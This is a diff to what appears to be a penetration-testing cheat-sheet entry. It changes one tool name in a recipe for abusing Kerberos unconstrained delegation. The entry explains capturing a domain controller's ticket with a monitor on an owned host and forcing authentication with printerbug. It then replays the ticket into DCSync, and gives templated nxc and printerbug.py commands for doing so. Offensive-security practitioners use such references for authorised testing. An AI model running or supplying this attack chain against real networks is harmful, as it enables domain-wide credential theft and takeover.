@@ -14,11 +14,11 @@ pair: unconstrained-deleg-4624
 A host with unconstrained delegation (`TRUSTED_FOR_DELEGATION`) caches the TGT of
 *anyone* who authenticates to it. Own such a host, run a TGT monitor on it (Rubeus
 `monitor` on Windows, `krbrelayx.py` on Linux), then coerce a DC to authenticate
-to you with printerbug — its TGT lands in your cache and you replay it into DCSync.
+to you with printerbug.py — its TGT lands in your cache and you replay it into DCSync.
 `{{rhost}}` is the DC (coerced); `{{lhost}}` is the unconstrained host you control
 (same slot roles as `coerce-petitpotam`).
 
 ```sh
 nxc ldap {{rhost}} -u {{user}} -p {{password}} --trusted-for-delegation
-printerbug {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
+printerbug.py {{domain}}/{{user}}:{{password}}@{{rhost}} {{lhost}}
 ```
